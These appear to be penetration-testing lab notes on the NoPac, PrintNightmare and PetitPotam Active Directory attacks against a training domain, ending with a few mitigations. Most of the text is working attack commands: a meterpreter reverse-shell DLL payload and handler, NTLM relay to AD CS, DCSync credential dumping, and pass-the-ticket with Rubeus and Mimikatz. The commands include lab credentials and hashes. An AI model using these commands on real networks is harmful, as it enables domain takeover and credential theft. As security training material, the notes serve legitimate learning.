
- [CVEs](#cves)
    - [NoPac (SamAccountName Spoofing)](#nopac-samaccountname-spoofing)
    - [PrintNightmare](#printnightmare)
    - [PetitPotam (MS-EFSRPC)](#petitpotam-ms-efsrpc)
        - [PetitPotam Mitigations](#petitpotam-mitigations)




# CVEs
## NoPac (SamAccountName Spoofing)
- You're tricking the system into treating a new computer (added by you) as if it's a Domain Controller (DC), which is a very important system in the network.
- How does it work?

    - Normally, users can add a few computers to the domain.
    - When adding a new computer, you rename it to mimic the name of an existing Domain Controller (its SamAccountName).
    - The system gets confused because it sees the new computer and the DC as the same, due to the name match.
    - When you request Kerberos tickets, The system mistakenly gives you tickets for the Domain Controller instead of your new computer.


- We can use this [tool](https://github.com/Ridter/noPac) to perform the attack

> [!IMPORTANT]
> In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. 
> If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.


```bash
# Scanning for NoPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Running NoPac & Getting a Shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Using noPac to DCSync the Built-in Administrator Account
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

```

## PrintNightmare
- PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems.

- Using cube0x0's exploit:

```bash
# Cloning the Exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git

```

- For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's

```bash
# Install cube0x0's Version of Impacket
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```
- We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.

```bash
# Enumerating for MS-RPRN
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generating a DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Creating a Share with smbserver.py
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Configuring & Starting MSF multi/handler
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 

# Running the Exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

```

## PetitPotam (MS-EFSRPC)
- An attacker coerces a Domain Controller into proving its identity to another system.
- What does the attacker do?
    - The attacker sends specially crafted messages to the DC over port 445.
    - This tricks the DC into connecting to another system and trying to authenticate using NTLM (a Windows authentication method).
    - The attacker intercepts and relays this authentication to a Certificate Authority (CA) system.

- **Attack steps**
1. Start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template.If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.
```bash
# Starting ntlmrelayx.py
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

```
2. In another window, we can run the tool PetitPotam.py. We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

> [!IMPORTANT]
> There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

```bash
# Running PetitPotam.py
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
3. Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

4. Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```bash
# Requesting a TGT Using gettgtpkinit.py

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

5. The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```bash
# Setting the KRB5CCNAME Environment Variable
export KRB5CCNAME=dc01.ccache
```

6. We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```bash
# Using Domain Controller TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

```

7. Confirming Admin Access to the Domain Controller
```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

- **Alternatives**:
1. Once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
```bash
# Submitting a TGS Request for Ourselves Using getnthash.py

python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

2. We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.
```bash
# Using Domain Controller NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba


```

2. Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
```powershell
# Requesting TGT and Performing PTT with DC01$ Machine Account
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# We can then type klist to confirm that the ticket is in memory.
PS C:\Tools> klist

```
- Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.
```powershell
# Performing DCSync with Mimikatz
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt

```

### PetitPotam Mitigations

- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use